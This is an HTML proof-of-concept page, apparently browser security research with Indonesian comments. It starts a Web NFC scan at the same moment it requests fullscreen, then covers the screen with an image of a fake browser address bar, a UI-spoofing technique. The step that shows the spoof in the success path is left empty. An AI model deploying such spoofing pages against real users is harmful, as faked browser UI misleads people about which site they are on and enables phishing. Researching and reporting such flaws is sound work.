<!DOCTYPE html>
<html lang="en">
<head>
    <title>Security Research - NFC Fullscreen Spoof</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: white;
            font-family: sans-serif;
        }         
        #spoof {
            width: 100%;
            height: 100%;
            display: none;
            object-fit: cover;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 9999;
        }
        #content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }
        .trigger-box {
            padding: 40px;
            border: 3px dashed #333;
            border-radius: 15px;
            background: #f0f0f0;
            cursor: pointer;
        }
    </style>
</head>  
<body>
    <!-- Gambar UI Spoof (Omnibox Palsu) -->
    <img id="spoof" src="spoof.png.jpeg">

    <div id="content">
        <div class="trigger-box">
            <h1>NFC Security Test</h1>
            <p>Klik di sini untuk menguji UI Redressing via Web NFC</p>
        </div>
    </div>

    <script>
        window.onclick = async () => {
            const spoofImg = document.getElementById("spoof");
            const mainContent = document.getElementById("content");
            const elem = document.documentElement;

            try {
                // 1. Cek apakah Web NFC didukung
                if ('NDEFReader' in window) {
                    const ndef = new NDEFReader();
                    
                    // 2. Mulai pemindaian NFC (Memicu Dialog Sistem/Indikator)
                    // Kita panggil tepat sebelum atau bersamaan dengan Fullscreen
                    const nfcPromise = ndef.scan();

                    // 3. Masuk Fullscreen
                    if (elem.requestFullscreen) {
                        await elem.requestFullscreen();
                    }

                    // 4. Ganti tampilan ke Spoof
                   

                    await nfcPromise;
                } else {
                    alert("Web NFC tidak didukung di browser/perangkat ini.");
                }
            } catch (e) {
                console.log("NFC Error atau Izin Ditolak: " + e.name);
                
                // Fallback: Tetap masuk fullscreen jika NFC gagal
                if (elem.requestFullscreen) {
                    elem.requestFullscreen();
                }
                spoofImg.style.display = "block";
                mainContent.style.display = "none";
            }
        };
    </script>
</body>
</html>
